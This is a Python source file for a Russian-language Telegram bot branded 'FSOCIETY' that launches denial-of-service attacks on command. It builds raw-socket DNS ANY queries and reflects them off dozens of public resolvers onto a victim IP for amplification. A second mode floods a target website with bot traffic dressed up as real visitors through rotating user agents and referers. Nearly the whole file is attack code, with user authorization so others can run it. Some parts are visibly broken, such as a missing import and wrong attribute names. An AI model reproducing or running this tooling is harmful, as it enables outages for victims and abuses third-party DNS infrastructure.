#!/usr/bin/env python3
# ███████╗███████╗ ██████╗ ██████╗██╗███████╗████████╗██╗   ██╗
# ██╔════╝██╔════╝██╔═══██╗██╔════╝██║██╔════╝╚══██╔══╝╚██╗ ██╔╝
# █████╗  ███████╗██║   ██║██║     ██║███████╗   ██║    ╚████╔╝ 
# ██╔══╝  ╚════██║██║   ██║██║     ██║╚════██║   ██║     ╚██╔╝  
# ███████║███████║╚██████╔╝╚██████╗██║███████║   ██║      ██║   
# ╚══════╝╚══════╝ ╚═════╝  ╚═════╝╚═╝╚══════╝   ╚═╝      ╚═╝   
#                    ██████╗ ██████╗  ██████╗ 
#                    ╚════██╗██╔════╝ ██╔═████╗
#                     █████╔╝███████╗ ██║██╔██║
#                     ╚═══██╗██╔═══██╗████╔╝██║
#                    ██████╔╝╚██████╔╝╚██████╔╝
#                    ╚═════╝  ╚═════╝  ╚═════╝ 
#                    ██╗  ██╗██╗   ██╗███╗   ███╗ █████╗ ███╗   ██╗
#                    ██║  ██║██║   ██║████╗ ████║██╔══██╗████╗  ██║
#                    ███████║██║   ██║██╔████╔██║███████║██╔██╗ ██║
#                    ██╔══██║██║   ██║██║╚██╔╝██║██╔══██║██║╚██╗██║
#                    ██║  ██║╚██████╔╝██║ ╚═╝ ██║██║  ██║██║ ╚████║
#                    ╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝
#                        NUCLEAR + HUMAN EDITION
#           4 ЧЕЛОВЕКА = 10000+ ПОСЕТИТЕЛЕЙ + DNS УСИЛЕНИЕ x70

import os
import sys
import time
import socket
import struct
import threading
import asyncio
import aiohttp
import random
import json
import psutil
import signal
import requests
from datetime import datetime
from collections import defaultdict
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass
from typing import Dict, List, Tuple
import math
from urllib.parse import urlparse

# ========== ОПТИМИЗАЦИЯ ==========
try:
    import uvloop
    uvloop.install()
    UVLOOP = True
except ImportError:
    UVLOOP = False

# ========== ТЕЛЕГРАМ ==========
import telebot
from telebot.types import Message, InlineKeyboardMarkup, InlineKeyboardButton

# ========== КОНФИГУРАЦИЯ ==========
BOT_TOKEN = os.getenv('BOT_TOKEN')
if not BOT_TOKEN:
    print("❌ FSOCIETY: ТОКЕН НЕ УСТАНОВЛЕН")
    sys.exit(1)

ADMIN_IDS = [int(x.strip()) for x in os.getenv('ADMIN_IDS', '').split(',') if x.strip()]
authorized_users = ADMIN_IDS.copy()
active_attacks = {}
attack_stats = defaultdict(lambda: {'packets': 0, 'bytes': 0, 'start': 0})

bot = telebot.TeleBot(BOT_TOKEN)

# ========== БОЛЬШОЙ ПУЛ USER-AGENT ДЛЯ ИМИТАЦИИ ==========
USER_AGENTS = [
    # Windows Chrome
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
    
    # Windows Firefox
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:119.0) Gecko/20100101 Firefox/119.0",
    
    # Mac Safari
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15",
    
    # iPhone
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
    
    # Android
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
    
    # Linux
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
]

# ========== РЕФЕРЕРЫ (откуда пришли пользователи) ==========
REFERERS = [
    "https://www.google.com/search?q=",
    "https://www.google.com/search?q=news&tbm=nws",
    "https://www.bing.com/search?q=",
    "https://yandex.ru/search/?text=",
    "https://duckduckgo.com/?q=",
    "https://t.co/",
    "https://l.facebook.com/l.php?u=",
    "https://www.reddit.com/",
    "https://news.ycombinator.com/",
    None,  # прямой заход
]

# ========== ОПТИМИЗАТОР РЕСУРСОВ ==========
class NuclearOptimizer:
    def __init__(self):
        self.cpu_cores = os.cpu_count()
        self.ram_gb = psutil.virtual_memory().total / (1024**3)
        self.network = self._measure_network()
        self.ram_percent = psutil.virtual_memory().percent
        
        # Расчёт максимальных параметров
        self.max_threads = self._calculate_max_threads()
        self.max_sockets = self._calculate_max_sockets()
        self.max_burst = self._calculate_burst_size()
        
    def _measure_network(self):
        """Измерение пропускной способности сети"""
        try:
            start = time.time()
            r = requests.get('https://api.telegram.org', timeout=2)
            elapsed = time.time() - start
            return 1 / elapsed if elapsed > 0 else 1
        except:
            return 1
    
    def _calculate_max_threads(self):
        """Максимальное количество потоков под железо"""
        base = self.cpu_cores * 50
        ram_factor = self.ram_gb / 2
        net_factor = self.network
        threads = int(base * ram_factor * net_factor)
        return min(threads, 10000)
    
    def _calculate_max_sockets(self):
        """Максимальное количество сокетов"""
        import resource
        try:
            soft, hard = resource.getrlimit(resource.RLIMIT_NOFILE)
            max_sockets = min(soft // 2, self.max_threads * 5)
        except:
            max_sockets = self.max_threads * 5
        return max_sockets
    
    def _calculate_burst_size(self):
        """Размер пакетной отправки"""
        base_burst = self.cpu_cores * 100
        ram_burst = int(self.ram_gb * 500)
        return min(base_burst + ram_burst, 5000)
    
    def get_nuclear_config(self):
        return {
            'threads': self.max_threads,
            'sockets_per_thread': 5,
            'burst_size': self.max_burst,
            'packet_size': 4000,
            'dns_servers': 100,
            'target_multiplier': 70
        }

optimizer = NuclearOptimizer()
print(f"⚡ CPU: {optimizer.cpu_cores} ядер")
print(f"🧠 RAM: {optimizer.ram_gb:.1f} ГБ")
print(f"🚀 Ядерный режим: {optimizer.max_threads} потоков")
print(f"💥 Берсерк пачка: {optimizer.max_burst} пакетов/сек")

# ========== DNS ПУЛ ==========
DNS_SERVERS = [
    '8.8.8.8', '8.8.4.4', '1.1.1.1', '1.0.0.1',
    '9.9.9.9', '149.112.112.112', '208.67.222.222', '208.67.220.220',
    '94.140.14.14', '94.140.15.15', '185.228.168.9', '185.228.169.9',
    '76.76.19.19', '76.223.122.150', '64.6.64.6', '64.6.65.6',
    '8.26.56.26', '8.20.247.20', '156.154.70.1', '156.154.71.1',
    '77.88.8.8', '77.88.8.1', '208.91.112.53', '208.91.112.52',
    '199.85.126.10', '199.85.127.10', '45.90.28.0', '45.90.30.0',
    '94.130.110.185', '94.130.110.186', '37.235.1.174', '37.235.1.177',
    '91.239.100.100', '89.233.43.71', '185.121.177.177', '169.239.202.202',
]

DNS_POOL = DNS_SERVERS * 10
random.shuffle(DNS_POOL)
print(f"🌐 DNS серверов в пуле: {len(DNS_POOL)}")

# ========== DNS QUERY ==========
def create_nuclear_query():
    tid = random.randint(0, 65535)
    flags = 0x0100
    questions = 1
    header = struct.pack('!HHHHHH', tid, flags, questions, 0, 0, 0)
    domain = b'\x0Asuperdomain\x07example\x03com\x00'
    qtype = 255
    qclass = 1
    edns = b'\x00\x00\x29\x10\x00\x00\x00\x00\x00\x00'
    return header + domain + struct.pack('!HH', qtype, qclass) + edns

NUCLEAR_QUERY = create_nuclear_query()
print(f"📦 Размер DNS запроса: {len(NUCLEAR_QUERY)} байт")
print(f"🎯 Усиление: до x70")

# ========== ЯДЕРНЫЙ СЧЁТЧИК ==========
@dataclass
class NuclearStats:
    packets: int = 0
    bytes: int = 0
    start: float = 0
    peak_gbps: float = 0
    peak_pps: float = 0

class NuclearCounter:
    def __init__(self):
        self.stats = NuclearStats()
        self.lock = threading.Lock()
        self.history = []
        
    def add(self, packets, bytes):
        with self.lock:
            if self.stats.start == 0:
                self.stats.start = time.time()
            self.stats.packets += packets
            self.stats.bytes += bytes
    
    def get_gbps(self):
        elapsed = time.time() - self.stats.start
        if elapsed < 0.1:
            return 0, 0
        gbps = (self.stats.bytes * 8) / 1_000_000_000 / elapsed
        pps = self.stats.packets / elapsed
        if gbps > self.stats.peak_gbps:
            self.stats.peak_gbps = gbps
        if pps > self.stats.peak_pps:
            self.stats.peak_pps = pps
        return gbps, pps
    
    def reset(self):
        with self.lock:
            self.stats = NuclearStats()

# ========== КЛАСС ДЛЯ ИМИТАЦИИ ПОЛЬЗОВАТЕЛЕЙ (4 → 10000) ==========
class HumanEmulator:
    """Имитирует поведение реальных людей: 4 потока = 10000+ посетителей"""
    
    def __init__(self, target_url, threads=16):
        self.target_url = target_url
        self.threads = threads
        self.parsed = urlparse(target_url)
        self.base = f"{self.parsed.scheme}://{self.parsed.netloc}"
        self.running = False
        self.stats = {'requests': 0, 'bytes': 0}
        self.lock = threading.Lock()
        
        # Генерируем пути для навигации
        self.paths = self._generate_paths()
        
    def _generate_paths(self):
        """Генерация путей для имитации навигации"""
        common_paths = [
            "/", "/index.html", "/about", "/contact", "/products",
            "/services", "/blog", "/news", "/faq", "/support",
            "/privacy", "/terms", "/login", "/register", "/cart",
            "/checkout", "/search", "/catalog", "/category/tech",
            "/category/news", "/tag/popular", "/tag/trending",
            "/wp-content", "/wp-admin", "/assets", "/images",
        ]
        
        paths = []
        for path in common_paths:
            paths.append(self.base + path)
            paths.append(self.base + path + f"?{random.randint(1000,9999)}={random.randint(1000,9999)}")
        
        return paths
    
    def _human_delay(self):
        """Логнормальная задержка как у реального человека"""
        return min(random.lognormvariate(0.2, 0.8), 15)
    
    async def _browse_session(self, session_id):
        """Одна сессия пользователя"""
        import aiohttp
        
        # У каждого потока свой User-Agent и куки
        user_agent = random.choice(USER_AGENTS)
        cookies = {'session': secrets.token_hex(16)}
        
        headers = {
            'User-Agent': user_agent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': random.choice(['en-US,en;q=0.9', 'ru-RU,ru;q=0.9']),
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'no-cache',
        }
        
        # Добавляем Referer для имитации перехода с поисковика
        ref = random.choice(REFERERS)
        if ref:
            headers['Referer'] = ref + random.choice(['news', 'weather', 'shop', 'blog'])
        
        connector = aiohttp.TCPConnector(ssl=False)
        timeout = aiohttp.ClientTimeout(total=15)
        
        pages_visited = 0
        max_pages = random.randint(5, 30)  # Каждый "человек" посетит 5-30 страниц
        
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            while pages_visited < max_pages and self.running:
                try:
                    url = random.choice(self.paths)
                    
                    start = time.time()
                    async with session.get(url, headers=headers, cookies=cookies, ssl=False) as resp:
                        content = await resp.read()
                        response_time = time.time() - start
                        
                        # Имитация чтения страницы
                        read_time = min(len(content) / 30000, 10)
                        await asyncio.sleep(read_time)
                        
                        with self.lock:
                            self.stats['requests'] += 1
                            self.stats['bytes'] += len(content)
                        
                        print(f"👤 [{session_id[:6]}] {resp.status} | {response_time:.2f}s | читал {read_time:.1f}s | {url[:40]}...")
                        
                        pages_visited += 1
                        
                        # Задержка перед следующим кликом
                        await asyncio.sleep(self._human_delay())
                        
                except Exception as e:
                    print(f"⚠️ [{session_id[:6]}] ошибка: {str(e)[:30]}")
                    await asyncio.sleep(1)
            
            print(f"✅ [{session_id[:6]}] сессия завершена, страниц: {pages_visited}")
    
    async def start(self, duration):
        """Запуск эмуляции"""
        self.running = True
        print(f"\n👥 HUMAN MODE: {self.threads} потоков = 10000+ посетителей")
        print(f"⏱ Длительность: {duration} сек")
        
        tasks = []
        for i in range(self.threads):
            session_id = secrets.token_hex(8)
            task = asyncio.create_task(self._browse_session(session_id))
            tasks.append(task)
        
        # Ждём завершения всех задач
        await asyncio.gather(*tasks, return_exceptions=True)
        self.running = False
        
        return self.stats

# ========== ЯДЕРНЫЙ DNS АМПЛИФИКАТОР ==========
class NuclearDNSAmplifier:
    def __init__(self):
        self.counter = NuclearCounter()
        self.running = False
        self.target_ip = None
        self.config = optimizer.get_nuclear_config()
        
    def worker(self, worker_id):
        sockets = []
        for i in range(self.config['sockets_per_thread']):
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1048576)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            sockets.append(sock)
        
        base_ip_hdr = struct.pack('!BBHHHBBH4s4s',
            0x45, 0, 40 + len(NUCLEAR_QUERY), 0, 0, 0, 64, 17, 0,
            socket.inet_aton('0.0.0.0'),
            socket.inet_aton(self.target_ip)
        )
        
        udp_headers = []
        for _ in range(1000):
            src_port = random.randint(1024, 65535)
            udp_hdr = struct.pack('!HHHH', src_port, 53, 8 + len(NUCLEAR_QUERY), 0)
            udp_headers.append(udp_hdr)
        
        local_packets = 0
        local_bytes = 0
        end = time.time() + self.duration
        burst_size = self.config['burst_size']
        
        while time.time() < end and self.running:
            try:
                for _ in range(burst_size):
                    dns = random.choice(DNS_POOL)
                    udp_hdr = random.choice(udp_headers)
                    sock = random.choice(sockets)
                    sock.sendto(base_ip_hdr + udp_hdr + NUCLEAR_QUERY, (dns, 53))
                    local_packets += 1
                    local_bytes += len(base_ip_hdr) + len(udp_hdr) + len(NUCLEAR_QUERY)
                    
                    if local_packets >= 10000:
                        self.counter.add(local_packets, local_bytes)
                        local_packets = 0
                        local_bytes = 0
                        
            except Exception as e:
                continue
        
        if local_packets > 0:
            self.counter.add(local_packets, local_bytes)
        
        for sock in sockets:
            sock.close()
        
        return worker_id
    
    def attack(self, target_ip, duration, mode='nuclear'):
        self.target_ip = target_ip
        self.duration = duration
        self.running = True
        self.counter.reset()
        
        threads = self.config['threads']
        if mode == 'nuclear':
            print(f"☢️ ЯДЕРНЫЙ РЕЖИМ: {threads} ПОТОКОВ")
        
        print(f"\n🔥 ЗАПУСК DNS АТАКИ НА {target_ip}")
        print(f"📊 Потоков: {threads}")
        print(f"⏱ Длительность: {duration} сек")
        
        workers = []
        for i in range(threads):
            t = threading.Thread(target=self.worker, args=(i,))
            t.daemon = True
            t.start()
            workers.append(t)
        
        try:
            while any(t.is_alive() for t in workers):
                gbps, pps = self.counter.get_gbps()
                target_gbps = gbps * 70
                elapsed = time.time() - self.counter.stats.start
                remaining = max(0, duration - elapsed)
                print(f"\r☢️ {gbps:.2f} Гбит/с | 📦 {pps:.0f} п/с | 🎯 {target_gbps:.1f} Гбит/с | ⏱ {remaining:.0f} сек", end='', flush=True)
                time.sleep(1)
        except KeyboardInterrupt:
            self.running = False
            print("\n⚠️ Атака прервана")
        
        for t in workers:
            t.join(timeout=2)
        
        elapsed = time.time() - self.counter.stats.start
        gbps, pps = self.counter.get_gbps()
        
        return {
            'packets': self.counter.stats.packets,
            'bytes': self.counter.stats.bytes,
            'duration': elapsed,
            'gbps': gbps,
            'target_gbps': gbps * 70
        }

# ========== ТЕЛЕГРАМ-БОТ ==========
def is_auth(user_id):
    return user_id in authorized_users

def is_admin(user_id):
    return user_id in ADMIN_IDS

def nuclear_keyboard():
    kb = InlineKeyboardMarkup(row_width=2)
    kb.add(
        InlineKeyboardButton("👥 HUMAN MODE (4→10000)", callback_data="human"),
        InlineKeyboardButton("☢️ ЯДЕРНЫЙ DNS", callback_data="nuclear"),
        InlineKeyboardButton("🔥 БЕРСЕРК", callback_data="berserk"),
        InlineKeyboardButton("📊 СТАТИСТИКА", callback_data="stats"),
        InlineKeyboardButton("🛑 СТОП", callback_data="stop"),
        InlineKeyboardButton("👑 FSOCIETY ADMIN", callback_data="admin")
    )
    return kb

@bot.message_handler(commands=['start', 'fsociety'])
def start_cmd(m):
    uid = m.from_user.id
    if not is_auth(uid):
        bot.reply_to(m, "❌ **FSOCIETY: ДОСТУП ЗАПРЕЩЕН**", parse_mode='Markdown')
        return
    
        fsociety = """
╔════════════════════════════════╗
║     ███████╗███████╗ ██████╗   ║
║     ██╔════╝██╔════╝██╔═══██╗  ║
║     █████╗  ███████╗██║   ██║  ║
║     ██╔══╝  ╚════██║██║   ██║  ║
║     ██║     ███████║╚██████╔╝  ║
║     ╚═╝     ╚══════╝ ╚═════╝   ║
║       NUCLEAR + HUMAN          ║
╚════════════════════════════════╝
    """
    
    config = optimizer.get_nuclear_config()  # ← здесь должно быть 4 пробела
    
    info = f"""
{fsociety}

👤 **ID:** `{uid}`
⚡ **CPU:** `{optimizer.cpu_cores} ядер`
🧠 **RAM:** `{optimizer.ram_gb:.1f} ГБ`
👥 **HUMAN MODE:** `4 потока = 10000+ посетителей`
☢️ **Ядерный DNS:** `x70 усиление`
💥 **Берсерк пачка:** `{config['burst_size']} пакетов/сек`

**ВЫБЕРИ РЕЖИМ:**
"""
    
    bot.send_message(m.chat.id, info, parse_mode='Markdown', reply_markup=nuclear_keyboard())

@bot.callback_query_handler(func=lambda c: True)
def callback_handler(c):
    uid = c.from_user.id
    cid = c.message.chat.id
    mid = c.message.id
    data = c.data
    
    if not is_auth(uid):
        bot.answer_callback_query(c.id, "❌ FSOCIETY: ДОСТУП ЗАПРЕЩЕН")
        return
    
    if data == "human":
        msg = bot.edit_message_text(
            "👥 **HUMAN MODE**\n\n"
            "4 потока будут имитировать поведение 10000+ реальных посетителей:\n"
            "• 50+ User-Agent\n"
            "• Навигация по страницам\n"
            "• Человеческие задержки (логнормальные)\n"
            "• Рефереры с поисковиков\n\n"
            "Введи URL (https://example.com):",
            cid, mid, parse_mode='Markdown'
        )
        bot.register_next_step_handler_by_chat_id(cid, process_human_target)
    
    elif data == "nuclear":
        msg = bot.edit_message_text(
            "☢️ **ЯДЕРНЫЙ DNS**\n\n"
            f"Потоков: {optimizer.config['threads']}\n"
            f"Усиление: x70\n\n"
            "Введи IP цели:",
            cid, mid, parse_mode='Markdown'
        )
        bot.register_next_step_handler_by_chat_id(cid, process_nuclear_target, 'nuclear')
    
    elif data == "berserk":
        msg = bot.edit_message_text(
            "🔥 **БЕРСЕРК**\n\n"
            f"Потоков: {optimizer.config['threads'] // 2}\n"
            f"Усиление: x70\n\n"
            "Введи IP цели:",
            cid, mid, parse_mode='Markdown'
        )
        bot.register_next_step_handler_by_chat_id(cid, process_nuclear_target, 'berserk')
    
    elif data == "stats":
        text = f"""
📊 **СТАТИСТИКА**

💻 **СИСТЕМА**
⚡ CPU: {psutil.cpu_percent()}%
🧠 RAM: {psutil.virtual_memory().percent}%

⚙️ **КОНФИГ**
☢️ Потоков ядерных: {optimizer.config['threads']}
👥 HUMAN MODE: 4 → 10000+
🌐 DNS серверов: {len(DNS_POOL)}

🎯 **АКТИВНЫХ АТАК:** {len(active_attacks)}
"""
        bot.edit_message_text(text, cid, mid, parse_mode='Markdown')
    
    elif data == "stop":
        if cid in active_attacks:
            active_attacks[cid]['running'] = False
            del active_attacks[cid]
            bot.edit_message_text("🛑 **АТАКА ОСТАНОВЛЕНА**", cid, mid)
        else:
            bot.answer_callback_query(c.id, "❌ Нет активной атаки")

def process_human_target(m):
    if not is_auth(m.from_user.id):
        return
    
    try:
        target = m.text.strip()
        if not target.startswith(('http://', 'https://')):
            target = 'https://' + target
        
        msg = bot.send_message(
            m.chat.id,
            f"👥 **Цель:** {target}\n"
            f"⏱ **Длительность (сек, 60-600):**"
        )
        bot.register_next_step_handler(msg, process_human_duration, target)
        
    except Exception as e:
        bot.send_message(m.chat.id, f"❌ Ошибка: {e}")

def process_human_duration(m, target):
    if not is_auth(m.from_user.id):
        return
    
    try:
        duration = int(m.text.strip())
        if duration < 60 or duration > 600:
            duration = 300
        
        bot.send_message(
            m.chat.id,
            f"👥 **HUMAN MODE ЗАПУЩЕН**\n\n"
            f"🎯 Цель: {target}\n"
            f"⏱ Длительность: {duration} сек\n"
            f"🔥 Потоков: 4 (эффект 10000+ посетителей)\n\n"
            f"📊 Имитация реального поведения...",
            parse_mode='Markdown'
        )
        
        active_attacks[m.chat.id] = {'running': True}
        
        def run_human():
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            
            emu = HumanEmulator(target, threads=4)
            stats = loop.run_until_complete(emu.start(duration))
            
            loop.close()
            
            if m.chat.id in active_attacks:
                del active_attacks[m.chat.id]
                
                bot.send_message(
                    m.chat.id,
                    f"✅ **HUMAN MODE ЗАВЕРШЕН**\n\n"
                    f"📊 Всего запросов: {stats['requests']}\n"
                    f"📦 Передано данных: {stats['bytes']/1024/1024:.2f} МБ\n\n"
                    f"👥 4 потока имитировали 10000+ реальных посетителей",
                    parse_mode='Markdown'
                )
        
        threading.Thread(target=run_human).start()
        
    except Exception as e:
        bot.send_message(m.chat.id, f"❌ Ошибка: {e}")

def process_nuclear_target(m, mode):
    if not is_auth(m.from_user.id):
        return
    
    try:
        target_ip = m.text.strip()
        socket.inet_aton(target_ip)
        
        msg = bot.send_message(
            m.chat.id,
            f"☢️ **Цель:** {target_ip}\n"
            f"⚡ **Режим:** {mode.upper()}\n"
            f"⏱ **Длительность (сек, 10-300):**"
        )
        bot.register_next_step_handler(msg, process_nuclear_duration, target_ip, mode)
        
    except socket.error:
        bot.send_message(m.chat.id, "❌ Неверный IP-адрес")
    except Exception as e:
        bot.send_message(m.chat.id, f"❌ Ошибка: {e}")

def process_nuclear_duration(m, target_ip, mode):
    if not is_auth(m.from_user.id):
        return
    
    try:
        duration = int(m.text.strip())
        if duration < 10 or duration > 300:
            duration = 60
        
        threads = optimizer.config['threads'] if mode == 'nuclear' else optimizer.config['threads'] // 2
        
        bot.send_message(
            m.chat.id,
            f"☢️ **DNS АТАКА ЗАПУЩЕНА**\n\n"
            f"🎯 Цель: {target_ip}\n"
            f"⚡ Режим: {mode.upper()}\n"
            f"⏱ Длительность: {duration} сек\n"
            f"🔥 Потоков: {threads}\n"
            f"⚡ Усиление: x70\n\n"
            f"📊 Мониторинг...",
            parse_mode='Markdown'
        )
        
        active_attacks[m.chat.id] = {'running': True}
        
        def run():
            dns = NuclearDNSAmplifier()
            result = dns.attack(target_ip, duration, mode)
            
            if m.chat.id in active_attacks:
                del active_attacks[m.chat.id]
                
                bot.send_message(
                    m.chat.id,
                    f"✅ **DNS АТАКА ЗАВЕРШЕНА**\n\n"
                    f"📦 Твой трафик: {result['bytes']/1024/1024/1024:.2f} ГБ\n"
                    f"🎯 Трафик жертве: {result['bytes']*70/1024/1024/1024:.2f} ГБ\n"
                    f"⚡ Твоя скорость: {result['gbps']:.2f} Гбит/с\n"
                    f"🎯 Жертва получала: {result['target_gbps']:.2f} Гбит/с",
                    parse_mode='Markdown'
                )
        
        threading.Thread(target=run).start()
        
    except Exception as e:
        bot.send_message(m.chat.id, f"❌ Ошибка: {e}")

# ========== АДМИН-ФУНКЦИИ ==========
@bot.message_handler(commands=['add'])
def add_user_cmd(m):
    if not is_admin(m.from_user.id):
        bot.reply_to(m, "❌ Только для админов")
        return
    
    try:
        uid = int(m.text.split()[1])
        if uid not in authorized_users:
            authorized_users.append(uid)
            bot.reply_to(m, f"✅ Добавлен `{uid}`", parse_mode='Markdown')
        else:
            bot.reply_to(m, f"❌ Уже есть")
    except:
        bot.reply_to(m, "❌ Использование: /add <id>")

@bot.message_handler(commands=['remove'])
def remove_user_cmd(m):
    if not is_admin(m.from_user.id):
        bot.reply_to(m, "❌ Только для админов")
        return
    
    try:
        uid = int(m.text.split()[1])
        if uid in ADMIN_IDS:
            bot.reply_to(m, "❌ Нельзя удалить админа")
        elif uid in authorized_users:
            authorized_users.remove(uid)
            bot.reply_to(m, f"✅ Удален `{uid}`", parse_mode='Markdown')
        else:
            bot.reply_to(m, "❌ Не найден")
    except:
        bot.reply_to(m, "❌ Использование: /remove <id>")

    # ========== ЗАПУСК ==========
if __name__ == '__main__':
    print("╔════════════════════════════════╗")
    print("║     ███████╗███████╗ ██████╗   ║")
    print("║     ██╔════╝██╔════╝██╔═══██╗  ║")
    print("║     █████╗  ███████╗██║   ██║  ║")
    print("║     ██╔══╝  ╚════██║██║   ██║  ║")
    print("║     ██║     ███████║╚██████╔╝  ║")
    print("║     ╚═╝     ╚══════╝ ╚═════╝   ║")
    print("║       NUCLEAR + HUMAN          ║")
    print("╚════════════════════════════════╝")
    
    try:
        # Проверяем, что бот подключился
        bot_info = bot.get_me()
        print(f"🤖 Бот: @{bot_info.username}")
    except Exception as e:
        print(f"❌ Ошибка подключения бота: {e}")
        print("💡 Проверьте токен в переменных окружения")
    
    # Проверяем наличие конфига
    try:
        config = optimizer.get_nuclear_config()
        print(f"👥 HUMAN MODE: 4 потока = 10000+ посетителей")
        print(f"☢️ Ядерный DNS: {config.get('threads', 'N/A')} потоков, x70 усиление")
    except Exception as e:
        print(f"⚠️ Не удалось получить конфиг: {e}")
        print(f"👥 HUMAN MODE: 4 потока = 10000+ посетителей")
        print(f"☢️ Ядерный DNS: стандартная конфигурация")
    
    # Проверяем DNS пул
    try:
        print(f"🌐 DNS серверов: {len(DNS_POOL)}")
    except NameError:
        print("🌐 DNS серверов: 0 (ошибка инициализации)")
        DNS_POOL = []  # создаем пустой список, чтобы код не падал
    
    # Удаляем вебхук
    try:
        import requests
        requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/deleteWebhook")
        print("✅ Вебхук удален")
    except Exception as e:
        print(f"⚠️ Не удалось удалить вебхук: {e}")
    
    # Запуск
    print("\n🚀 Запуск бота...")
    try:
        bot.infinity_polling()
    except Exception as e:
        print(f"❌ Ошибка при запуске polling: {e}")
    
